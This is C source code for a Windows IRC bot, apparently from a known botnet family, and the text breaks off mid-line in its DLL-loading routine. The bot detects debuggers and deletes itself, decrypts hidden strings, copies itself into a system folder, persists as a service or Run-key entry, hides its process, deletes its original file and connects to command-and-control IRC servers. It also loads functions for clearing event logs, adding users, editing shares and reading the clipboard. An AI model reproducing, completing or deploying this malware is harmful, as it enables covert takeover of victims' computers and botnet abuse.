#include "../headers/includes.h"
#include "../headers/functions.h"
#include "../headers/config/configs.h"

#ifndef _DEBUG
#pragma comment(linker, "/subsystem:windows ")
#else
#pragma comment(linker, "/subsystem:console ")
#endif // _DEBUG

BOOL rkenabled;//did fu's driver get loaded?

DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE mutex;
int curserver;
int serversize=(sizeof(servers)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
#ifndef NO_VERSION_REPLY
int curversion;
int versionsize=(sizeof(versionlist)/sizeof(LPTSTR));
#else
int versionsize=0;
#endif

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#else
int main(int argc, char *argv[])
#endif
{
	LoadDLLs();
	
#ifndef NO_DDETECT
	if(IsBugged())
	{
		EraseMe(TRUE);
		ExitProcess(1);
	}
#endif

#ifndef NO_CRYPT
	decryptstrings(authsize, versionsize, serversize);
#endif

#ifndef NO_SERVICE
	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{servicename, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
		{NULL, NULL}
	};
#endif

	//TODO: Error handler here

#ifndef _DEBUG
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	char cfilename[MAX_PATH];
	char movetopath[MAX_PATH];
	char svcpath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	ExpandEnvironmentStrings(movepath,movetopath,sizeof(movetopath));
	sprintf(svcpath,"%s\\%s",movetopath,filename);
	
#ifndef _DEBUG
	if (MoveBot(movetopath,filename))
	{
#ifndef NO_MELT
		RegWrite(meltkey.hkey,meltkey.subkey,meltkey.name,cfilename);
#endif // NO_MELT


#ifndef NO_SERVICE
		InstallService(svcpath);
#else
		RegWrite(runkey.hkey,runkey.subkey,runkey.name,svcpath);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef _DEBUG
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif // _DEBUG
		if (CreateProcess(svcpath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
#endif // NO_SERVICE
		ExitProcess(1);
	}
#endif // _DEBUG
#ifndef NO_SERVICE
	if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(svcpath);
#else
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
#endif // NO_SERVICE
#ifdef _DEBUG
//	CloseLog();
#endif
	return 0;
}

DWORD WINAPI BotThread(LPVOID param)
{
	mutex = CreateMutex(NULL, FALSE, mutexhandle);
	while(GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(1);

	addthread(MAIN_THREAD,str_main_thread,main_title);

#ifndef NO_MELT
		char *melt=RegQuery(meltkey.hkey,meltkey.subkey,meltkey.name);
		if (melt)
		{
			SetFileAttributes(melt,FILE_ATTRIBUTE_NORMAL);
			int tries=0;
			while (FileExists(melt) && tries<3)
			{
				DeleteFile(melt);
				tries++;
				Sleep(2000);
			}
			RegDelete(meltkey.hkey,meltkey.subkey,meltkey.name);
		}
#endif // NO_MELT
		
	srand(GetTickCount());
	dwstarted=GetTickCount();
#ifndef NO_VERSION_REPLY
	curversion=rand()%(versionsize);
#ifdef _DEBUG
	printf("Generated current_version: %d (%d), %s.\n",curversion,versionsize,versionlist[curversion]);
#endif
#endif

	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);

#ifndef NO_INSTALLED_TIME
	if (!noadvapi32)
		GetInstalledTime();
	else
		sprintf(installedt,"Error");
#endif // NO_INSTALLED_TIME
	
	int i=0;
	DWORD id=0;

#ifndef NO_RECORD_UPTIME
	i=addthread(RUPTIME_THREAD,str_rup_thread,main_title);
	threads[i].tHandle=CreateThread(NULL,0,&RecordUptimeThread,0,0,&id);
#endif // NO_RECORD_UPTIME

#ifndef _DEBUG // maybe this will give the shutdown handler time to work
	RegWrite(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control","WaitToKillServiceTimeout","7000");
#endif
	
	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));


	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
#ifdef _DEBUG
			printf("Trying to connect to: %s:%i\r\n",servers[curserver].host,servers[curserver].port);
#endif
#ifndef NO_FLUSHDNS
			FlushDNSCache();
#endif
			mainirc.start(servers[curserver].host,servers[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),servers[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(serversize-1))
			curserver=0;
		else
			curserver++;
	}

	// cleanup;
	killthreadall();
	fWSACleanup();
	ReleaseMutex(mutex);
	ExitThread(0);
}


// kernel32.dll function variables
SEM fSetErrorMode;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;
M32F fModule32First;
GDFSE fGetDiskFreeSpaceEx;
GLDS fGetLogicalDriveStrings;
GDT fGetDriveType;
SP fSearchPath;
QPC fQueryPerformanceCounter;
QPF fQueryPerformanceFrequency;
RSP fRegisterServiceProcess;
GCNA fGetComputerName;


// user32.dll function variables
CW fCloseWindow;
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;
#ifndef NO_WINDOWCTRL
EW fEnumWindows;
GWI fGetWindowInfo;
GWTPI fGetWindowThreadProcessId;
SW fShowWindow;
IWV fIsWindowVisible;
GCN fGetClassName;
#endif // NO_WINDOWCTRL

// advapi32.dll function variables
ROKE fRegOpenKeyEx;
RCKE fRegCreateKeyEx;
RSVE fRegSetValueEx;
RQVE fRegQueryValueEx;
RDV fRegDeleteValue;
RDK fRegDeleteKey;
RCK fRegCloseKey;
REKE fRegEnumKeyEx;
REV fRegEnumValue;
RQIK fRegQueryInfoKey;
#ifndef NO_PROCESS
OTT fOpenThreadToken;
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;
#endif // NO_PROCESS
#ifndef NO_LSARESTRICT
LOP fLsaOpenPolicy;
LEAWUR fLsaEnumerateAccountsWithUserRight;
LLN2 fLsaLookupNames2;
LAAR fLsaAddAccountRights;
LRAR fLsaRemoveAccountRights;
LFM fLsaFreeMemory;
LC fLsaClose;
LNSTWE fLsaNtStatusToWinError;
#endif // NO_LSARESTRICT
#ifndef NO_CEL
CEL fClearEventLog;
CLEL fCloseEventLog;
OEL fOpenEventLog;
#endif // NO_CEL
OSCM fOpenSCManager;
SS fStartService;
CRS fCreateService;
OS fOpenService;
CSH fCloseServiceHandle;
SSCD fStartServiceCtrlDispatcher;
ESS fEnumServicesStatus;
CS fControlService;
DS fDeleteService;
IVSD fIsValidSecurityDescriptor;
ILOU fImpersonateLoggedOnUser;
LSD fLockServiceDatabase;
QSLS fQueryServiceLockStatus;
CSC2 fChangeServiceConfig2;
USD fUnlockServiceDatabase;
RSCH fRegisterServiceCtrlHandler;
SSS fSetServiceStatus;
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif // NO_SYSINFO

// gdi32.dll function variables
CDC fCreateDC;
CDIBS fCreateDIBSection;
CCDC fCreateCompatibleDC;
GDC fGetDeviceCaps;
GDIBCT fGetDIBColorTable;
SO fSelectObject;
BB fBitBlt;
DDC fDeleteDC;
DO fDeleteObject;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
WSAAS fWSAAsyncSelect;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
NTOHS fntohs;
NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
RECVFROM frecvfrom;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;
SD fshutdown;

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
FGF fFtpGetFile;
FPF fFtpPutFile;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;

HANDLE ih;

// icmp.dll function variables
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif // NO_PING

// netapi32.dll function variables
NSA fNetShareAdd;
NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;

// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;


// iphlpapi.dll function variables
GIT fGetIfTable;
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;
GTT fGetTcpTable;
GUT fGetUdpTable;

#ifndef NO_ENETINFO
GNP fGetNetworkParams;
#endif // NO_ENETINFO

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;

// psapi.dll function variables
GMFNE fGetModuleFileNameEx;
GMBN fGetModuleBaseName;
EPM fEnumProcessModules;
EP fEnumProcesses;
GPMI fGetProcessMemoryInfo;

#ifndef NO_PSTORE
//pstorec.dll function variables
PSCI fPStoreCreateInstance;
#endif

//shlwapi.dll function variables
PRFS fPathRemoveFileSpec;


// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
BOOL noadvapi32lsa = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
BOOL noiphlpapinsp = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;
BOOL nopsapi = FALSE;
DWORD nopsapierr = 0;
BOOL nopstore = FALSE;
DWORD nopstoreerr = 0;
BOOL noshlwapi = FALSE;
DWORD noshlwapierr = 0;

BOOL LoadDLLs(void) 
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
		fModule32First = (M32F)GetProcAddress(kernel32_dll, "Module32First");
		fGetDiskFreeSpaceEx = (GDFSE)GetProcAddress(kernel32_dll, "GetDiskFreeSpaceExA");
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, "GetLogicalDriveStringsA");
		fGetDriveType = (GDT)GetProcAddress(kernel32_dll, "GetDriveTypeA");
		fSearchPath = (SP)GetProcAddress(kernel32_dll, "SearchPathA");
		fQueryPerformanceCounter = (QPC)GetProcAddress(kernel32_dll, "QueryPerformanceCounter");
		fQueryPerformanceFrequency = (QPF)GetProcAddress(kernel32_dll, "QueryPerformanceFrequency");
		fGetComputerName = (GCNA)GetProcAddress(kernel32_dll, "GetComputerNameA");

		if (!fSetErrorMode || !fCreateToolhelp32Snapshot || !fProcess32First || !fProcess32Next 
			|| !fGetDiskFreeSpaceEx || !fGetLogicalDriveStrings || !fGetDriveType || !fSearchPath 
			|| !fQueryPerformanceCounter || !fQueryPerformanceFrequency || !fGetComputerName)
			nokernel32 = TRUE;

		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		// hide from the Windows 9x Task Manager
		if (fRegisterServiceProcess) 
			fRegisterServiceProcess(0, 1);
	} else {
		nokernel32err = GetLastError();
		nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fCloseWindow = (CW)GetProcAddress(user32_dll,"CloseWindow");
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fCloseWindow || !fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow 
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;

#ifndef NO_WINDOWCTRL
		fEnumWindows = (EW)GetProcAddress(user32_dll,"EnumWindows");
		fGetWindowInfo = (GWI)GetProcAddress(user32_dll,"GetWindowInfo");
		fGetWindowThreadProcessId = (GWTPI)GetProcAddress(user32_dll,"GetWindowThreadProcessId");
		fShowWindow = (SW)GetProcAddress(user32_dll,"ShowWindow");
		fIsWindowVisible = (IWV)GetProcAddress(user32_dll,"IsWindowVisible");
		fGetClassName = (GCN)GetProcAddress(user32_dll,"GetClassNameA");
		
		if (!fEnumWindows || !fGetWindowInfo || !fGetWindowThreadProcessId || !fShowWindow
			|| !fIsWindowVisible || !fGetClassName)
			nouser32 = TRUE;

#endif // NO_WINDOWCTRL

	} else {
		nouser32err = GetLastError();
		nouser32 = TRUE;
	}

	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = LoadLibrary("advapi32.dll");
    if (advapi32_dll) {
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll,"RegOpenKeyExA");
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll,"RegCreateKeyExA");
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll,"RegSetValueExA");
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll,"RegQueryValueExA");
		fRegDeleteValue = (RDV)GetProcAddress(advapi32_dll,"RegDeleteValueA");
		fRegDeleteKey = (RDK)GetProcAddress(advapi32_dll,"RegDeleteKeyA");
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll,"RegCloseKey");
		fRegEnumKeyEx = (REKE)GetProcAddress(advapi32_dll,"RegEnumKeyExA");
		fRegEnumValue = (REV)GetProcAddress(advapi32_dll,"RegEnumValueA");
		fRegQueryInfoKey = (RQIK)GetProcAddress(advapi32_dll,"RegQueryInfoKeyA");

		if (!fRegOpenKeyEx || !fRegCreateKeyEx || !fRegSetValueEx 
			|| !fRegQueryValueEx || !fRegDeleteValue || !fRegDeleteKey || !fRegCloseKey
			|| !fRegEnumValue || !fRegQueryInfoKey)
	        noadvapi32 = TRUE;

#ifndef NO_PROCESS
		fOpenThreadToken = (OTT)GetProcAddress(advapi32_dll,"OpenThreadToken");
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenThreadToken || !fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges) 
	        noadvapi32 = TRUE;		
#endif // NO_PROCESS

#ifndef NO_LSARESTRICT
		fLsaOpenPolicy = (LOP)GetProcAddress(advapi32_dll,"LsaOpenPolicy");
		fLsaEnumerateAccountsWithUserRight = (LEAWUR)GetProcAddress(advapi32_dll,"LsaEnumerateAccountsWithUserRight");
		fLsaLookupNames2 = (LLN2)GetProcAddress(advapi32_dll, "LsaLookupNames2");
		fLsaAddAccountRights = (LAAR)GetProcAddress(advapi32_dll,"LsaAddAccountRights");
		fLsaRemoveAccountRights = (LRAR)GetProcAddress(advapi32_dll,"LsaRemoveAccountRights");
		fLsaFreeMemory = (LFM)GetProcAddress(advapi32_dll,"LsaFreeMemory");
		fLsaClose = (LC)GetProcAddress(advapi32_dll,"LsaClose");
		fLsaNtStatusToWinError = (LNSTWE)GetProcAddress(advapi32_dll,"LsaNtStatusToWinError");

		if (!fLsaOpenPolicy || !fLsaEnumerateAccountsWithUserRight || !fLsaLookupNames2 || !fLsaAddAccountRights 
			|| !fLsaRemoveAccountRights || !fLsaFreeMemory || !fLsaClose || !fLsaNtStatusToWinError)
			noadvapi32lsa = TRUE;
#endif // NO_LSARESTRICT

	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
		fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");
		fCreateService = (CRS)GetProcAddress(advapi32_dll,"CreateServiceA");
	 	fStartServiceCtrlDispatcher = (SSCD)GetProcAddress(advapi32_dll,"StartServiceCtrlDispatcherA");
	 	fImpersonateLoggedOnUser = (ILOU)GetProcAddress(advapi32_dll,"ImpersonateLoggedOnUser");
	 	fLockServiceDatabase = (LSD)GetProcAddress(advapi32_dll,"LockServiceDatabase");
		fQueryServiceLockStatus = (QSLS)GetProcAddress(advapi32_dll,"QueryServiceLockStatusA");
		fChangeServiceConfig2 = (CSC2)GetProcAddress(advapi32_dll,"ChangeServiceConfig2A");
		fUnlockServiceDatabase = (USD)GetProcAddress(advapi32_dll,"UnlockServiceDatabase");
		fRegisterServiceCtrlHandler = (RSCH)GetProcAddress(advapi32_dll,"RegisterServiceCtrlHandlerA");
		fSetServiceStatus = (SSS)GetProcAddress(advapi32_dll,"SetServiceStatus");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus
			|| !fIsValidSecurityDescriptor || !fImpersonateLoggedOnUser || !fLockServiceDatabase
			|| !fQueryServiceLockStatus || !fChangeServiceConfig2 || !fUnlockServiceDatabase
			|| !fRegisterServiceCtrlHandler || !fSetServiceStatus)
	        noadvapi32 = TRUE;

#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");

		if (!fGetUserName)
			noadvapi32 = TRUE;
#endif // NO_SYSINFO

#ifndef NO_CEL
		fClearEventLog = (CEL)GetProcAddress(advapi32_dll,"ClearEventLogA");
		fOpenEventLog = (OEL)GetProcAddress(advapi32_dll,"OpenEventLogA");
		fCloseEventLog = (CLEL)GetProcAddress(advapi32_dll,"CloseEventLog");

		if (!fClearEventLog || !fOpenEventLog || !fCloseEventLog)
			noadvapi32 = TRUE;
#endif

	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}

	// dynamically load gdi32.dll
 	HMODULE gdi32_dll = GetModuleHandle("gdi32.dll");
    if (gdi32_dll) {
		fCreateDC = (CDC)GetProcAddress(gdi32_dll,"CreateDCA");
		fCreateDIBSection = (CDIBS)GetProcAddress(gdi32_dll,"CreateDIBSection");
		fCreateCompatibleDC = (CCDC)GetProcAddress(gdi32_dll,"CreateCompatibleDC");
		fGetDeviceCaps = (GDC)GetProcAddress(gdi32_dll,"GetDeviceCaps");
		fGetDIBColorTable = (GDIBCT)GetProcAddress(gdi32_dll,"GetDIBColorTable");
		fSelectObject = (SO)GetProcAddress(gdi32_dll,"SelectObject");
		fBitBlt = (BB)GetProcAddress(gdi32_dll,"BitBlt");
		fDeleteDC = (DDC)GetProcAddress(gdi32_dll,"DeleteDC");
		fDeleteObject = (DO)GetProcAddress(gdi32_dll,"DeleteObject");

		if (!fCreateDC || !fCreateDIBSection || !fCreateCompatibleDC || !fGetDeviceCaps 
			|| !fGetDIBColorTable || !fSelectObject || !fBitBlt || !fDeleteDC || !fDeleteObject)
	        nogdi32 = TRUE;
	} else {
		nogdi32err = GetLastError();
		nogdi32 = TRUE;
	}

    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAAsyncSelect = (WSAAS)GetProcAddress(ws2_32_dll,"WSAAsyncSelect");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll,"WSAIoctl");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fioctlsocket = (IOCTLS)GetProcAddress(ws2_32_dll,"ioctlsocket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll,"ntohs");
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll,"ntohl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll,"recvfrom");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");
		fshutdown = (SD)GetProcAddress(ws2_32_dll,"shutdown");

		if (!fWSAStartup || !fWSASocket || !fWSAAsyncSelect || !fWSAIoctl || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fioctlsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fntohs || !fsend || !fsendto || !frecv || !frecvfrom || !fbind
			|| !fselect || !flisten || !faccept || !fsetsockopt || !fgetsockname || !fgethostname
			|| !fgethostbyname || !fgethostbyaddr || !fclosesocket)	
	        nows2_32 = TRUE;

	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
		fFtpGetFile = (FGF)GetProcAddress(wininet_dll, "FtpGetFileA");
		fFtpPutFile = (FPF)GetProcAddress(wininet_dll, "FtpPutFileA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}

#ifndef NO_PING
	// dynamically load icmp.dll
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
#endif // NO_PING
	
	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
	 	fNetShareAdd = (NSA)GetProcAddress(netapi32_dll,"NetShareAdd");
	 	fNetShareDel = (NSD)GetProcAddress(netapi32_dll,"NetShareDel");
		fNetShareEnum = (NSE)GetProcAddress(netapi32_dll,"NetShareEnum");
	 	fNetScheduleJobAdd = (NSJA)GetProcAddress(netapi32_dll,"NetScheduleJobAdd");
	 	fNetApiBufferFree = (NABF)GetProcAddress(netapi32_dll,"NetApiBufferFree");
	 	fNetRemoteTOD = (NRTOD)GetProcAddress(netapi32_dll,"NetRemoteTOD");
	 	fNetUserAdd = (NUA)GetProcAddress(netapi32_dll,"NetUserAdd");
	 	fNetUserDel = (NUD)GetProcAddress(netapi32_dll,"NetUserDel");
	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");
	 	fNetUserGetInfo = (NUGI)GetProcAddress(netapi32_dll,"NetUserGetInfo");
		fNetMessageBufferSend = (NMBS)GetProcAddress(netapi32_dll,"NetMessageBufferSend");
		
		if (!fNetShareAdd || !fNetShareDel || !fNetShareEnum || !fNetScheduleJobAdd 
